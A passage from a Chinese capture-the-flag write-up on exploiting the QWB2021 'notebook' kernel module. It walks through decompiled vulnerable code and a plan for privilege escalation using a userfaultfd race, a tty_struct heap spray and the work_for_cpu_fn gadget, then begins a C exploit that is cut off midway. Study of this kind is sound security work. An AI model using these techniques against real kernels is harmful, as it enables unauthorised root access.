UFFD_EVENT_PAGEFAULT);</span><br><span class="line">        <span class="comment">// 构造uffdio_copy进而调用ioctl-UFFDIO_COPY处理这个user-fault</span></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// page(我们已有的一个页大小的数据)中page_size大小的内容将被拷贝到新分配的msg.arg.pagefault.address内存页中</span></span><br><span class="line">        ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy);</span><br><span class="line">          ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例题：QWB2021-notebook"><a href="#例题：QWB2021-notebook" class="headerlink" title="例题：QWB2021-notebook"></a>例题：QWB2021-notebook</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a><strong>题目分析</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -append <span class="string">&quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">    -nographic \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic \</span><br><span class="line">    -device e1000 \</span><br><span class="line">    -smp cores=2,threads=2 \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -monitor /dev/null 2&gt;/dev/null \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure><p>保护开启了smep，smap，kaslr进入系统可以看到还开启了kpti。</p><p>题目就是一个菜单堆题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">mynote_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">    userarg notearg; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(file *))_fentry__)(file);</span><br><span class="line">    copy_from_user(&amp;notearg, v3, <span class="number">0x18</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">0x100</span> )</span><br><span class="line">        <span class="keyword">return</span> noteadd(notearg.idx, notearg.size, notearg.buf);</span><br><span class="line">    <span class="keyword">if</span> ( cmd &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( cmd == <span class="number">0x64</span> )</span><br><span class="line">            <span class="keyword">return</span> notegift(notearg.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( cmd == <span class="number">0x200</span> )</span><br><span class="line">            <span class="keyword">return</span> notedel(notearg.idx);</span><br><span class="line">        <span class="keyword">if</span> ( cmd == <span class="number">0x300</span> )</span><br><span class="line">            <span class="keyword">return</span> noteedit(notearg.idx, notearg.size, notearg.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;[x] Unknown ioctl cmd!\n&quot;</span>, notearg.size, notearg.buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-100LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">noteadd</span><span class="params">(<span class="keyword">size_t</span> idx, <span class="keyword">size_t</span> size, <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v4; <span class="comment">// r13</span></span><br><span class="line">    note *v5; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">size_t</span> v6; <span class="comment">// r14</span></span><br><span class="line">    __int64 v7; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    _fentry__(idx);</span><br><span class="line">    <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = <span class="number">-1LL</span>;</span><br><span class="line">        printk(<span class="string">&quot;[x] Add idx out of range.\n&quot;</span>, size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        v4 = v3;</span><br><span class="line">        v5 = &amp;notebook[idx];</span><br><span class="line">        raw_read_lock(&amp;lock);</span><br><span class="line">        v6 = v5-&gt;size;</span><br><span class="line">        v5-&gt;size = size;</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">0x60</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v5-&gt;size = v6;</span><br><span class="line">            v7 = <span class="number">-2LL</span>;</span><br><span class="line">            printk(<span class="string">&quot;[x] Add size out of range.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            copy_from_user(name, v4, <span class="number">0x100</span>LL);</span><br><span class="line">            <span class="keyword">if</span> ( v5-&gt;note )</span><br><span class="line">            &#123;</span><br><span class="line">                v5-&gt;size = v6;</span><br><span class="line">                v7 = <span class="number">-3LL</span>;</span><br><span class="line">                printk(<span class="string">&quot;[x] Add idx is not empty.\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                v5-&gt;note = (<span class="keyword">void</span> *)_kmalloc(size, <span class="number">0x24000C0</span>LL);</span><br><span class="line">                printk(<span class="string">&quot;[+] Add success. %s left a note.\n&quot;</span>, name);</span><br><span class="line">                v7 = <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        raw_read_unlock(&amp;lock);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在create函数里，是首先将对应位置的size放到栈上，随后直接把输入的size放到了储存size的地址，并且接着就是一个copy_from_user。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">noteedit</span><span class="params">(<span class="keyword">size_t</span> idx, <span class="keyword">size_t</span> newsize, <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v4; <span class="comment">// r13</span></span><br><span class="line">    note *v5; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">size_t</span> size; <span class="comment">// rax</span></span><br><span class="line">    __int64 v7; <span class="comment">// r12</span></span><br><span class="line">    __int64 v8; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    _fentry__(idx);</span><br><span class="line">    <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v8 = <span class="number">-1LL</span>;</span><br><span class="line">        printk(<span class="string">&quot;[x] Edit idx out of range.\n&quot;</span>, newsize);</span><br><span class="line">        <span class="keyword">return</span> v8;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = v3;</span><br><span class="line">    v5 = &amp;notebook[idx];</span><br><span class="line">    raw_read_lock(&amp;lock);</span><br><span class="line">    size = v5-&gt;size;</span><br><span class="line">    v5-&gt;size = newsize;</span><br><span class="line">    <span class="keyword">if</span> ( size == newsize )</span><br><span class="line">    &#123;</span><br><span class="line">        v8 = <span class="number">1LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> editout;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = (*(__int64 (__fastcall **)(<span class="keyword">void</span> *, <span class="keyword">size_t</span>, __int64))krealloc.gap0)(v5-&gt;note, newsize, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    copy_from_user(name, v4, <span class="number">0x100</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !v5-&gt;size )</span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">&quot;free in fact&quot;</span>);</span><br><span class="line">        v5-&gt;note = <span class="number">0LL</span>;</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> editout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)_virt_addr_valid(v7) )</span><br><span class="line">    &#123;</span><br><span class="line">        v5-&gt;note = (<span class="keyword">void</span> *)v7;</span><br><span class="line">        v8 = <span class="number">2LL</span>;</span><br><span class="line">        editout:</span><br><span class="line">        raw_read_unlock(&amp;lock);</span><br><span class="line">        printk(<span class="string">&quot;[o] Edit success. %s edit a note.\n&quot;</span>, name);</span><br><span class="line">        <span class="keyword">return</span> v8;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;[x] Return ptr unvalid.\n&quot;</span>);</span><br><span class="line">    raw_read_unlock(&amp;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到虽然在create函数存在size的验证，但是在edit函数不存在任何验证，并且一样是在krealloc之后就有一个copy_from_user。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">notegift</span><span class="params">(<span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _fentry__(buf);</span><br><span class="line">    printk(<span class="string">&quot;[*] The notebook needs to be written from beginning to end.\n&quot;</span>);</span><br><span class="line">    copy_to_user(buf, notebook, <span class="number">0x100</span>LL);</span><br><span class="line">    printk(<span class="string">&quot;[*] For this special year, I give you a gift!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">100LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的gift函数就是把所有堆地址给泄露出来。</p><h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a><strong>利用分析</strong></h4><p>那么就上面分析出来的结果可以得出目前的利用思路就是，首先利用userfaultfd机制形成一个UAF的堆块，然后利用结构中含有指针的结构体进行堆喷，那么我们就可以进一步的泄漏出地址出来。下一步就是我们可以修改指针进行栈迁移，我们可以把ROP链写在另外一个堆上面，因为可以泄露堆地址的缘故所以我们可以直接栈迁移到写了ROP链的堆上面。这里使用的结构体是tty_struct，其中有tty_operations是一个类似于vtable的函数表，所以我们利用三个堆块即可完成利用。</p><p>上面是常规思路，这里主要写一下新的思路。</p><p>内核中存在这样一个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(<span class="keyword">void</span> *);</span><br><span class="line">    <span class="keyword">void</span> *arg;</span><br><span class="line">    <span class="keyword">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">work_for_cpu_fn</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, struct work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面函数在编译过后表达的形式其实是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">work_for_cpu_fn</span><span class="params">(<span class="keyword">size_t</span> * args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    args[<span class="number">6</span>] = ((<span class="keyword">size_t</span> (*) (<span class="keyword">size_t</span>)) (args[<span class="number">4</span>](args[<span class="number">5</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read / write / ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。</p><p>所以这里只需要用到两个堆块，第一个堆块我们要形成一个size为0x2e0的UAF堆块，第二个堆块没有要求。使用堆喷让tty_struct喷到我们的UAF堆块，但是我们需要确认他是否成功了，在tty_struct的第一个成员是一个魔数，我们可以利用他进行判断。随后修改tty_operations指针指向另外一个堆块，紧接着根据上面的函数中的偏移修改tty_struct的内容即可</p><h4 id="综上，得出exp"><a href="#综上，得出exp" class="headerlink" title="综上，得出exp"></a><strong>综上，得出exp</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page, <span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">userfaultfd_stuck_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler created&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span 